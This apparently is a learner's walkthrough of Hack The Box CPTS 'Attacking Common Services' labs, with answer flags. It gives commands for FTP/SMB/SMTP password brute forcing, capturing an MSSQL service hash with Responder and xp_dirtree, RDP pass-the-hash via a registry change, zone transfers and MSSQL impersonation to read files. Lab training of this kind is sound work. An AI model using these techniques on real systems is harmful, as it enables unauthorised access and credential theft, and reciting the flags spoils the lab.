---
title: CPTS labs - 10 Attacking Common Services
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 10 Attacking Common Services

## [Attacking Common Services](https://academy.hackthebox.com/module/details/116)

### FTP

**What port is the FTP service running on?**

```
sudo nmap -sC -sV $ip -Pn -p-
```

Results: 2121

**What username is available for the FTP server?**

```
# Footprint the service and check out that anonymous user is enabled. Login into the ftp service and download the userlist and password list. After that...

# Two ways:
medusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121
hydra -L users.list  -P pws.list ftp://$ip:2121 
```

Results:  robin

**Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.**

```
ssh robin@$ip
cat flag.txt
```

Results: HTB{ATT4CK1NG_F7P_53RV1C3}


### SMB

**What is the name of the shared folder with READ permissions?**

```
smbmap -H $ip
```

Results: GGJ

**What is the password for the username "jason"?**

```
sudo nmap -sC -sV $ip -Pn
# Results 22,53, 139,445,2121

ftp $ip 2121
# Enter anonymous and anonymous

# Download files
mget *.list

# Checksmb services
smbmap -H //
smbclient //$ip/GGJ -N
smbclient //$ip/GGJ -N -r

# However, downloading the id_rsa file is not possible due to permissions. 
smbmap -H  $ip --download GGJ/id_rsa  //NOT WORKING 

# We will download from resources pwd.list and launch a brute for attack 
crackmapexec smb $ip -u jason -p pws.list  -d ATTCSVC-LINUX
```

Results: 34c8zuNBo91!@28Bszh

**Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**

```
# Log in as jason
smbclient  //$ip/GGJ -U jason
#Enter password
get id_rsa
quit

chmod 600 id_rsa
ssh -i id_rsa jason@$ip
cat flag.txt
```

Results: HTB{SMB_4TT4CKS_2349872359}

### SQL Databases
Authenticate to $ip with user "htbdbuser" and password "MSSQLAccess01!"

**What is the password for the "mssqlsvc" user?**

```
# Connect to the db using mssqlclient impacket
mssqlclient.py -p 1433 htbdbuser@$ip
# Enter creds when prompted

# Whoami
select user_name();

# List users:
SELECT name FROM master..syslogins
# The one we are looking for is not present.

# We will try to capture MSSQL Service Hash by using `xp_dirtree` undocumented stored procedures.
# In our attacker machine open a new terminal and set a responder listener
sudo responder -I tun0

# In the already connected mssql command line: 
EXEC master..xp_dirtree '\\$ipAttacker\share'

# The responder listener will print:
NTLMv2-SSP Hash     : mssqlsvc::WIN-02:5b55e0dc6b4e012d:9061B752E27B9DC08B778088A813DDF6:0101000000000000801A85C76927DB01E0A642B53DA7BF6000000000020008004A00420059004F0001001E00570049004E002D0037003500460059004F0055004F00540052004F00360004003400570049004E002D0037003500460059004F0055004F00540052004F0036002E004A00420059004F002E004C004F00430041004C00030014004A00420059004F002E004C004F00430041004C00050014004A00420059004F002E004C004F00430041004C0007000800801A85C76927DB0106000400020000000800300030000000000000000000000000300000ABE564474E572C0FDA65F14FE47C49910CF6D5E2D84E98065E4910B32B2B9D850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000

# Let's save it to a file
echo "mssqlsvc::WIN-02:5b55e0dc6b4e012d:9061B752E27B9DC08B778088A813DDF6:0101000000000000801A85C76927DB01E0A642B53DA7BF6000000000020008004A00420059004F0001001E00570049004E002D0037003500460059004F0055004F00540052004F00360004003400570049004E002D0037003500460059004F0055004F00540052004F0036002E004A00420059004F002E004C004F00430041004C00030014004A00420059004F002E004C004F00430041004C00050014004A00420059004F002E004C004F00430041004C0007000800801A85C76927DB0106000400020000000800300030000000000000000000000000300000ABE564474E572C0FDA65F14FE47C49910CF6D5E2D84E98065E4910B32B2B9D850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000" > hash.txt

# And now... crack it with John the ripper
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```

Results: princess1


**Enumerate the "flagDB" database and submit a flag as your answer.**

```
# We know that user mssqlsvc:princess1 is part of the windows authentication, so we login into the service with those creds:
mssqlclient.py -p 1433 mssqlsvc@$ip -windows-auth
# and enter the password

# List databases
SELECT name FROM master.dbo.sysdatabases

# Let's see tables in flagDB
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES

# Ok, we need to select the DB before asking for its contents
USE flagDB

# Now print the content of the table:
SELECT * FROM tb_flag
```

Results: HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}

### RDP
RDP to  with user "htb-rdp" and password "HTBRocks!"

**What is the name of the file that was left on the Desktop? (Format example: filename.txt).**

```
xfreerdp /d:$domain] /u:$user /p:$pass /v:$ip
```

Results: pentest-notes.txt


**Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?**

Reading the file pentest-notes.txt

```
We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.

User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824
```

Which means that RDP connection with pass the hash needs some troubleshooting. 
*Restricted Admin Mode*, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


Results: DisableRestrictedAdmin


**Connect via RDP with the Administrator account and submit the flag.txt as you answer.**

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.

```
xfreerdp /d:$domain /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /v:$ip 
```

Results: `HTB{RDP_P4$$_Th3_H4$#}`

### DNS

Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.

```
# Enumerate subdomains
dnsenum --dnsserver 10.129.86.251 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
# you will get the following subdomains:
# ns.inlanefreight.htb, control.inlanefreight.htb, helpdesk.inlanefreight.htb


# Install subbrute
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1

# Access the tool
cd subbrute

# Configure resolver file 
echo "ns.inlanefreight.htb" > ./resolvers.txt

# Enumerate subdomains with subbrute
python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
# You will get the following subdomains:
# hr.inlanefreight.htb

# Attempt a zone transfer
 dig AXFR @ns.inlanefreight.htb hr.inlanefreight.htb 
```


```
; <<>> DiG 9.19.21-1-Debian <<>> AXFR @ns.inlanefreight.htb hr.inlanefreight.htb
; (1 server found)
;; global options: +cmd
hr.inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
hr.inlanefreight.htb.	604800	IN	TXT	"HTB{LUIHNFAS2871SJK1259991}"
hr.inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
ns.hr.inlanefreight.htb. 604800	IN	A	127.0.0.1
hr.inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 40 msec
;; SERVER: 10.129.86.251#53(ns.inlanefreight.htb) (TCP)
;; WHEN: Fri Nov 01 14:34:47 EDT 2024
;; XFR size: 5 records (messages 1, bytes 230)
```

Results: `HTB{LUIHNFAS2871SJK1259991}`


### SMTP

**What is the available username for the domain inlanefreight.htb in the SMTP server?**

```
smtp-user-enum -M RCPT -U users.list  -D inlanefreight.htb -t $ip
```

Results: marlin

**Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.**

```
hydra -l marlin@inlanefreight.htb -P passwords.list -f $ip pop3
# It will return the password: poohbear

# Now connect to POP server
telnet $ip 110
USER marlin@inlanefreight.htb
PASS poohbear
STATS
LIST
RETR 1
```

Results: `HTB{w34k_p4$$w0rd}`



### Skills Assessment

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format: - `HTB{...}`. Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

**EASY. You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.**

```
sudo nmap -sC -sV -Pn $ip
echo "$ip    inlanefreight.htb" | sudo tee -a /etc/host

# Download the users.list from HTB or you will go bananas
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t $ip 
# As a result you get fiona@inlanefreight.htb exists

# Password attack
hydra -l fiona@inlanefreight.htb -P passwords.list -t 64 -f $ip smtp
# Result: [25][smtp] host: 10.129.179.42   login: fiona@inlanefreight.htb   password: 987654321

# Now we login into the service mysql
mysql -u fiona -p"987654321" -h $ip

SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
```

Results: `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`


The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

**MEDIUM: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.**

```
sudo nmap -sC -sV -Pn -p- $ip

ftp $ip 30021
# Enter as creds anonymous:anonymous
# dir
# cd simon
# mget *.txt
# quit

ssh simon@$ip
# Enter password 8Ns8j1b!23hs4921smHzwn

cat flag.txt
```

Results: HTB{1qay2wsx3EDC4rfv_M3D1UM}



**Hard. The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.** 

What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)

```
smbclient -L \\$ip -U simon 

smbclient  \\\\$ip\\Home -U simon -N
cd IT
cd Simon
```

Results: random.txt

Enumerate the target and find a password for the user Fiona. What is her password?

```
smbclient -L \\$ip -U simon 

smbclient  \\\\$ip\\Home -U simon -N
cd IT
cd Fiona
get creds.txt
quit

cat creds.txt
#Try with all creds and see that "48Ns72!bns74@S84NNNSl" works for:
smbclient  \\\\$ip\\Home -U fiona 
```

Results: `48Ns72!bns74@S84NNNSl`


Once logged in, what other user can we compromise to gain admin privileges?

Results: John

Submit the contents of the flag.txt file on the Administrator Desktop.

```
rdesktop -u Fiona -p '48Ns72!bns74@S84NNNSl' $ip

# Open Powershell
sqlcmd

# List databases
1> SELECT name FROM master.dbo.sysdatabases
2> go
# Enumerate DB and nothing interesting comes out

# Verify if our current user has the sysadmin role:
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
#  value 0 indicates no sysadmin role, value 1 is sysadmin role. Fiona has no sysadminrole


# Identify Users that we Can Impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
go

# As a result we can see john. Let's impersonate him and verify if hjohn has sysadmin role
EXECUTE AS LOGIN = 'john';  
SELECT SYSTEM_USER;  
SELECT IS_SRVROLEMEMBER('sysadmin');  
go

# No sysadmin role for john


# Identify linked Servers in MSSQL
SELECT srvname, isremote FROM sysservers
go

# As response we have
# WINSRV02\SQLEXPRESS                                         # LOCAL.TEST.LINKED.SRV                                                                                                     
# We can read files from that connection in local
execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv]; 

```

Results: `HTB{46u$!n9_l!nk3d_$3rv3r$}` 
